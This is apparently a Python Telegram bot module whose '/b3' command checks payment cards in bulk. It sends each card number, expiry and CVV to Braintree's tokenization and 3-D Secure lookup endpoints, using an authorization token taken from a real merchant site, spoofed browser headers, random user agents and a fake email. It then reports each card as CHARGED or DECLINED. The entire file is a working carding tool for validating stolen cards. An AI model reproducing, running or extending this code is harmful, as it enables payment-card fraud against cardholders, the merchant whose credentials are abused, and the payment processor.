import re
import time
import requests
import user_agent
from faker import Faker
from pyrogram import Client, filters
from EQUROBOT import app

fake = Faker()
email = fake.email()

request = requests.session()

Z = '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'

# Removed the logo printing using pyfiglet

@app.on_message(filters.command("b3"))
def handle_b3(client, message):
    card_details = message.text.split('\n')[1:]  # Assuming card details are sent in the message body

    for i in card_details:
        ccc = i.split('\n')[0]
        c = ccc.split('|')
        cc = c[0]
        mo = c[1]
        ye = c[2]
        cv = c[3]

        def payment_method():
            url = 'https://payments.braintree-api.com/graphql'
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
                'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTUwODIwNjYsImp0aSI6IjMyNzk5MmI1LWVjZWItNGYxOC04MTBkLTc4MDZkNzYzMDE4NyIsInN1YiI6IjI5bm12bWtwdGs1ZG1zazYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWdhdGV3YXkuY29tIiwibWVyY2hhbnQiOnsidmVyaWZ5X2NhcmRfYnlkZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.VAGirmcu6_wGdlzD3xGMt5wb-9DL_MD-KRQ__yzwUF_r_QJy28znIMiZ95fz2ouErAWBOwF7v1ZnL8hk5EKlzw',
                'Braintree-Version': '2018-05-10',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://assets.braintreegateway.com',
                'Referer': 'https://assets.braintreegateway.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'User-Agent': user_agent.generate_user_agent(),
                'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }
            data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'dropin2',
                    'sessionId': '2787e07d-a9da-4863-89e3-83c8e3922854',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mo,
                            'expirationYear': ye,
                            'cvv': cv,
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            req = request.post(url, headers=headers, json=data)
            return req.json()["data"]["tokenizeCreditCard"]["token"]

        def lookup_nonce():
            url = f'https://api.braintreegateway.com/merchants/29nmvmkptk5dmsk6/client_api/v1/payment_methods/{payment_method()}/three_d_secure/lookup'
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://www.mp-molds.com',
                'Referer': 'https://www.mp-molds.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'User-Agent': user_agent.generate_user_agent(),
                'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }
            data = {
                'amount': '0.00',
                'additionalInfo': {
                    'billingLine1': '',
                    'billingLine2': '',
                    'billingCity': '',
                    'billingState': '',
                    'billingPostalCode': '',
                    'billingCountryCode': 'US',
                    'billingPhoneNumber': '',
                    'billingGivenName': '',
                    'billingSurname': '',
                    'email': 'ffhsbshwj@hi2.in',
                },
                'bin': '400022',
                'dfReferenceId': '0_02a322f2-3b1a-4e88-8b53-83ced6259370',
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.97.0',
                    'cardinalDeviceDataCollectionTimeElapsed': 9903,
                    'issuerDeviceDataCollectionTimeElapsed': 11290,
                    'issuerDeviceDataCollectionResult': False,
                },
                'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTUwODIwNjYsImp0aSI6IjMyNzk5MmI1LWVjZWItNGYxOC04MTBkLTc4MDZkNzYzMDE4NyIsInN1YiI6IjI5bm12bWtwdGs1ZG1zazYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWdhdGV3YXkuY29tIiwibWVyY2hhbnQiOnsidmVyaWZ5X2NhcmRfYnlkZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.VAGirmcu6_wGdlzD3xGMt5wb-9DL_MD-KRQ__yzwUF_r_QJy28znIMiZ95fz2ouErAWBOwF7v1ZnL8hk5EKlzw',
                'braintreeLibraryVersion': 'braintree/web/3.97.0',
                '_meta': {
                    'merchantAppId': 'www.mp-molds.com',
                    'platform': 'web',
                    'sdkVersion': '3.97.0',
                    'source': 'client',
                    'integration': 'custom',
                    'integrationType': 'custom',
                    'sessionId': 'e34c01dc-90ed-43b3-9219-8c055b443fe7',
                },
            }
            req = request.post(url, headers=headers, json=data)
            return req.json()

        try:
            r = lookup_nonce()
            nonce = r['paymentMethod']['nonce']
            print(F + '\nCHARGED ' + X + ' ' + Z + ' ' + B + f'{cc}|{mo}|{ye}|{cv} ')
            message.reply_text(f'CHARGED: {cc}|{mo}|{ye}|{cv}')
        except Exception as e:
            print(Z + '\nDECLINED ' + X + ' ' + Z + ' ' + B + f'{cc}|{mo}|{ye}|{cv} ')
            message.reply_text(f'DECLINED: {cc}|{mo}|{ye}|{cv}')
